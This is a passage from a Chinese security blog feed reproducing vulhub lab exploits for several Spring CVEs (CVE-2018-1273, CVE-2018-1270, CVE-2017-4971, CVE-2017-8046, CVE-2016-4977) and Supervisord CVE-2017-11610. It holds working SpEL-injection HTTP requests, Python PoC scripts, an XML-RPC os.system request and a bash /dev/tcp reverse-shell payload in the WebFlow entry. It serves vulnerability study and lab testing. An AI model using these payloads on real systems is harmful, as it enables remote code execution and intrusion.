        <content type="html"><![CDATA[<h1 id="Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程命令执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h1><p>Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，<code>Spring Data Commons</code> 是 Spring Data 下所有子项目共享的基础框架。Spring Data Commons 在 <code>2.0.5 及以前版本中</code>，存在一处 SpEL 表达式注入漏洞，攻击者可以注入恶意 SpEL 表达式以执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="noopener">https://pivotal.io/security/cve-2018-1273</a></li><li><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="noopener">https://xz.aliyun.com/t/2269</a></li></ul><p>环境启动后，访问 <a href="http://your-ip:8080/users" target="_blank" rel="noopener">http://your-ip:8080/users</a>，将可以看到一个用户注册页面。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>参考前面链接中的 Payload，在注册的时候抓包，并修改成如下数据包：</p><pre class=" language-http"><code class="language-http">POST /users?page=&amp;size=5 HTTP/1.1<span class="token header-name keyword">Host:</span> localhost:8080<span class="token header-name keyword">Connection:</span> keep-alive<span class="token header-name keyword">Content-Length:</span> 124<span class="token header-name keyword">Pragma:</span> no-cache<span class="token header-name keyword">Cache-Control:</span> no-cache<span class="token header-name keyword">Origin:</span> http://localhost:8080<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<span class="token header-name keyword">Referer:</span> http://localhost:8080/users?page=0&amp;size=5<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate, br<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9,en;q=0.8username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</code></pre><p>执行反弹 shell payload：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322114427.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322114442.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</title>
      <link href="/2019/03/03/spring-messaging-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/spring-messaging-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h1><p>spring messaging 为 spring 框架提供消息支持，其上层协议是STOMP，底层通信基于 SockJS，</p><p>在 spring messaging 中，其允许客户端订阅消息，并使用 selector 过滤消息。selector 用 SpEL 表达式编写，并使用 <code>StandardEvaluationContext</code> 解析，造成命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://pivotal.io/security/cve-2018-1270" target="_blank" rel="noopener">https://pivotal.io/security/cve-2018-1270</a></li><li><a href="https://github.com/CaledoniaProject/CVE-2018-1270" target="_blank" rel="noopener">https://github.com/CaledoniaProject/CVE-2018-1270</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>网上大部分文章都说 spring messaging 是基于 <code>websocket</code> 通信，其实不然。spring messaging是基于 <code>sockjs</code>（可以理解为一个通信协议），而 <code>sockjs</code> 适配多种浏览器：现代浏览器中使用 <code>websocket</code> 通信，老式浏览器中使用 <code>ajax</code> 通信。</p><p>连接后端服务器的流程，可以理解为：</p><ol><li>用 <code>STOMP</code> 协议将数据组合成一个文本流</li><li>用 <code>sockjs</code> 协议发送文本流，<code>sockjs</code> 会选择一个合适的通道： <code>websocket</code> 或 <code>xhr(http)</code>，与后端通信</li></ol><p>所以我们可以使用 <code>http</code> 来复现漏洞，称之为“降维打击”。</p><p>下为一个简单的 POC 脚本 <code>exploit.py</code></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">import</span> logging<span class="token keyword">import</span> sys<span class="token keyword">import</span> jsonlogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>base <span class="token operator">=</span> f<span class="token string">'{url}/{random.randint(0, 1000)}/{random_str(8)}'</span>        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'Referer'</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span>        <span class="token punctuation">}</span>        self<span class="token punctuation">.</span>t <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> f<span class="token string">'{self.base}/htmlfile?c=_jp.vulhub'</span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token string">'{k}:{v}'</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>f<span class="token string">'{self.base}/xhr_send?t={self.t}'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">"send '{command}' data error."</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">"send '{command}' data success."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://your-ip:8080/gs-guide-websocket'</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'accept-version'</span><span class="token punctuation">:</span> <span class="token string">'1.1,1.0'</span><span class="token punctuation">,</span>    <span class="token string">'heart-beat'</span><span class="token punctuation">:</span> <span class="token string">'10000,10000'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'subscribe'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'selector'</span><span class="token punctuation">:</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')"</span><span class="token punctuation">,</span>    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'sub-0'</span><span class="token punctuation">,</span>    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/topic/greetings'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'vulhub'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'content-length'</span><span class="token punctuation">:</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/app/hello'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span></code></pre><p>因为该漏洞是订阅的时候插入 <code>SpEL</code> 表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：</p><ol><li>基础地址，在 vulhub 中为 <code>http://your-ip:8080/gs-guide-websocket</code></li><li>待执行的 SpEL 表达式，如 <code>T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')</code></li><li>某一个订阅的地址，如 vulhub 中为：<code>/topic/greetings</code></li><li>如何触发这个订阅，即如何让后端向这个订阅发送消息。在 vulhub 中，我们向 <code>/app/hello</code> 发送一个包含 <code>name</code> 的 <code>json</code>，即可触发这个事件。当然在实战中就不同了，所以这个 poc 并不具有通用性。<br>根据你自己的需求修改 POC。如果是 vulhub 环境，你只需修改 1 中的url 即可。</li></ol><p>执行反弹 shell payload：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322113047.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322113052.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</title>
      <link href="/2019/03/03/spring-webflow-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/spring-webflow-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h1><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的 field，将导致一个 SpEL 表达式注入漏洞，最终造成任意命令执行。</p><p>参考链接：</p><ul><li><a href="https://threathunter.org/topic/593d562353ab369c55425a90" target="_blank" rel="noopener">https://threathunter.org/topic/593d562353ab369c55425a90</a></li><li><a href="https://pivotal.io/security/cve-2017-4971" target="_blank" rel="noopener">https://pivotal.io/security/cve-2017-4971</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问 <a href="http://your-ip:8080/login" target="_blank" rel="noopener">http://your-ip:8080/login</a>，用页面左边给出的任意一个账号/密码登录系统：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322104022.png-water_print" alt=""></p><p>然后访问 id 为 1 的酒店 <a href="http://your-ip:8080/hotels/1" target="_blank" rel="noopener">http://your-ip:8080/hotels/1</a>，点击预订按钮 <code>Book Hotel</code>，填写相关信息后点击 <code>Process</code> （从这一步，其实 <code>WebFlow</code> 就正式开始了）：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322105009.png-water_print" alt=""></p><p>再点击确认 <code>Confirm</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322105045.png-water_print" alt=""></p><p>抓该 POST 请求数据包，向其中添加一个字段（也就是反弹shell的POC）：</p><pre><code>_(new java.lang.ProcessBuilder("bash","-c","bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1")).start()=vulhub</code></pre><p><code>注</code>：将 payload 进行 URL 编码。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322105123.png-water_print" alt=""></p><p>成功执行，获得 shell：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322105230.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</title>
      <link href="/2019/03/03/spring-data-rest-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/spring-data-rest-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）"><a href="#Spring-Data-Rest-远程命令执行漏洞（CVE-2017-8046）" class="headerlink" title="Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）"></a>Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）</h1><p>Spring Data REST 是一个构建在 Spring Data 之上，为了帮助开发者更加容易地开发 REST 风格的 Web 服务。在 REST API 的 Patch 方法中，path 的值被传入 <code>setValue</code> ，导致执行了 SpEL 表达式，触发远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="http://xxlegend.com/2017/09/29/Spring%20Data%20Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/09/29/Spring%20Data%20Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/</a></li><li><a href="https://tech.meituan.com/Spring_Data_REST_远程代码执行漏洞%28CVE-2017-8046%29_分析与复现.html" target="_blank" rel="noopener">https://tech.meituan.com/Spring_Data_REST_远程代码执行漏洞%28CVE-2017-8046%29_分析与复现.html</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://your-ip:8080/customers/1" target="_blank" rel="noopener">http://your-ip:8080/customers/1</a>，看到一个资源。我们使用 <code>PATCH</code> 请求来修改：</p><pre class=" language-http"><code class="language-http">PATCH /customers/1 HTTP/1.1<span class="token header-name keyword">Host:</span> localhost:8080<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/json-patch+json<span class="token header-name keyword">Content-Length:</span> 202<span class="token application/json"><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token string">"op"</span><span class="token punctuation">:</span> <span class="token string">"replace"</span><span class="token punctuation">,</span> <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"vulhub"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span></span></code></pre><p><code>path</code> 的值是 <code>SpEL</code> 表达式，发送上述数据包，将执行 <code>new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}</code> 表示的命令 <code>touch /tmp/success</code>。然后进入容器 <code>docker-compose exec spring bash</code> 查看：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322111805.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322110815.png-water_print" alt=""></p><p>可见，success 成功创建。</p><p>将 bytecode 改成反弹 shell 的命令（注意：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java反弹shell的限制与绕过方式</a>），成功弹回：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322111916.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322111926.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</title>
      <link href="/2019/03/03/spring-security-oauth2-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/spring-security-oauth2-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</h1><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>参考链接：</p><ul><li><a href="http://secalert.net/#CVE-2016-4977" target="_blank" rel="noopener">http://secalert.net/#CVE-2016-4977</a></li><li><a href="https://deadpool.sh/2017/RCE-Springs/" target="_blank" rel="noopener">https://deadpool.sh/2017/RCE-Springs/</a></li><li><a href="http://blog.knownsec.com/2016/10/spring-security-oauth-rce/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/10/spring-security-oauth-rce/</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test" target="_blank" rel="noopener">http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a>。首先需要填写用户名和密码，我们这里填入admin:admin即可。</p><p>可见，我们输入是SpEL表达式${233*233}已经成功执行并返回结果：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322095116.png-water_print" alt=""></p><p>然后，我们使用 <code>poc.py</code> 来生成反弹 shell 的 POC（注意：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java反弹shell的限制与绕过方式</a>）：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>message <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'Enter message to encode:'</span><span class="token punctuation">)</span>poc <span class="token operator">=</span> <span class="token string">'${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> <span class="token operator">%</span> ord<span class="token punctuation">(</span>message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> ch <span class="token keyword">in</span> message<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>   poc <span class="token operator">+=</span> <span class="token string">'.concat(T(java.lang.Character).toString(%s))'</span> <span class="token operator">%</span> ord<span class="token punctuation">(</span>ch<span class="token punctuation">)</span> poc <span class="token operator">+=</span> <span class="token string">')}'</span><span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200322095130.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supervisord 远程命令执行漏洞（CVE-2017-11610）</title>
      <link href="/2019/03/03/supervisord-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/supervisord-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Supervisord-远程命令执行漏洞（CVE-2017-11610）"><a href="#Supervisord-远程命令执行漏洞（CVE-2017-11610）" class="headerlink" title="Supervisord 远程命令执行漏洞（CVE-2017-11610）"></a>Supervisord 远程命令执行漏洞（CVE-2017-11610）</h1><h2 id="Supervisord"><a href="#Supervisord" class="headerlink" title="Supervisord"></a>Supervisord</h2><p>Supervisord 是一款 Python 开发，用于管理后台应用（服务）的工具，其角色类似于 Linux 自带的 Systemd。</p><p>比 Systemd 有几个特点：</p><ul><li>配置比较简单</li><li>一个简单的第三方应用，与系统没有耦合</li><li>提供 HTTP API，支持远程操作</li></ul><p>Supervisord 的架构分为 <code>Server</code> 和 <code>Client</code>，<code>Server</code> 以一个服务的形式，跑在系统后台，而 <code>Client</code> 是一个命令行工具，其实就是根据用户的要求，调用 <code>Server</code> 提供的 <code>API</code>，执行一些工作。</p><p>查看 <code>Supervisord</code> 的配置文件可知，默认情况下，<code>Server</code> 端监听在 <code>unix</code> 套接字 <code>unix:///tmp/supervisor.sock</code> 上，而 <code>Client</code> 配置的 <code>serverurl</code> 也是这个地址：</p><pre class=" language-conf"><code class="language-conf">[unix_http_server]file=/tmp/supervisor.sock   ; the path to the socket file;chmod=0700                 ; socket file mode (default 0700);chown=nobody:nogroup       ; socket file uid:gid owner;username=user              ; default is no username (open server);password=123               ; default is no password (open server);[inet_http_server]         ; inet (TCP) server disabled by default;port=127.0.0.1:9001        ; ip_address:port specifier, *:port for all iface;username=user              ; default is no username (open server);password=123               ; default is no password (open server)[supervisorctl]serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket;username=chris              ; should be same as in [*_http_server] if set;password=123                ; should be same as in [*_http_server] if set;prompt=mysupervisor         ; cmd line prompt (default "supervisor");history_file=~/.sc_history  ; use readline history if available</code></pre><p>所以，Client 端去连接配置文件中的 serverurl 的地址，并与其使用RPC协议（基于HTTP协议）通信。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接执行任意命令：</p><pre class=" language-http"><code class="language-http">POST /RPC2 HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 213&lt;?xml version="1.0"?>&lt;methodCall>&lt;methodName>supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName>&lt;params>&lt;param>&lt;string>touch /tmp/success&lt;/string>&lt;/param>&lt;/params>&lt;/methodCall></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321111950.png-water_print" alt=""></p><h2 id="直接回显的-POC"><a href="#直接回显的-POC" class="headerlink" title="直接回显的 POC"></a>直接回显的 